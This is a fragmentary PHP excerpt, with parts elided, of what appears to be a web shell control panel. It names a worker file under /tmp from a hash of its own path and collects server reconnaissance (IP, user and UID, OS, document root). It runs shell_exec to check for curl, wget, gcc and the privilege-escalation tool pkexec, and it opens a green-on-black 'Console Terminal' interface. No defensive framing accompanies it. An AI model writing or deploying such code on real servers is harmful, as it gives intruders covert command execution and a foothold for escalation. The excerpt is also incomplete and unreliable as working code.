...
$worker_name = "/tmp/sess_" . md5($self_path); 
...
<style>
    ...
    .terminal-header { color: #00ff00; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #444; padding-bottom: 5px; }
    .sys-info { font-family: monospace; font-size: 12px; margin-bottom: 15px; line-height: 1.6; color: #ddd; }
    .sys-info b { color: #00ff00; min-width: 120px; display: inline-block; }
...
$php_ver = phpversion();
$cur_user = get_current_user() . " (" . getmyuid() . ")";
$os = php_uname();
...
$cmds = ['curl', 'wget', 'python', 'perl', 'ruby', 'gcc', 'pkexec'];
$cmd_status = [];
foreach ($cmds as $c) {
    $status = shell_exec("which $c") ? "YES" : "NO";
    $cmd_status[] = strtoupper($c) . " ($status)";
}

// --- TERMINAL & SYSTEM INFO UI ---
echo "<div class='terminal-card'>
    <div class='terminal-header'>System Information</div>
    <div class='sys-info'>
        <b>Server IP:</b> $server_ip<br>
        <b>Server Software:</b> $server_soft<br>
        <b>PHP Version:</b> $php_ver<br>
        <b>Current User:</b> $cur_user<br>
        <b>Operating System:</b> $os<br>
        <b>Document Root:</b> $doc_root<br>
        <b>Server Port:</b> $server_port<br>
        <b>Server Admin:</b> $server_admin<br>
        <b>Command Line:</b> " . implode(", ", $cmd_status) . "<br>
    </div>
    
    <div class='terminal-header' style='border:none; margin-top:10px;'>Console Terminal</div>
